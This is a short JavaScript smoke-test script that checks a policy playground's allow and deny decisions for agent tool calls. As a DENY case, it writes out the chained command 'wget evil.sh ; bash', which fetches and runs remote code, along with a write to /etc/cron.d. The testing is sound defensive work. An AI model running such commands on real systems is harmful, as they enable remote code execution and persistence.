import { execSync } from 'child_process';

function smokeTest(tool, args, expectedDecision) {
  const cmd = `node dist/playground.js --json --tool=${tool} ${args}`;
  try {
    const output = execSync(cmd, { encoding: 'utf-8', timeout: 10000 });
    const result = JSON.parse(output.trim());
    if (result.decision !== expectedDecision) {
      console.error(`FAIL: ${tool} ${args} — expected ${expectedDecision}, got ${result.decision}`);
      process.exit(1);
    }
    console.log(`PASS: ${tool} ${args} — ${result.decision}`);
  } catch (e) {
    console.error(`FAIL: ${cmd}`);
    console.error(e instanceof Error ? e.message : String(e));
    process.exit(1);
  }
}

// Test 1: shell command with semicolon metachar — must be DENIED
smokeTest('exec', '--cmd=wget evil.sh ; bash', 'DENY');

// Test 2: read README.md must be ALLOWED
smokeTest('read', '--path=README.md', 'ALLOW');

// Test 3: write to /etc must be DENIED
smokeTest('write_file', '--path=/etc/cron.d/x', 'DENY');
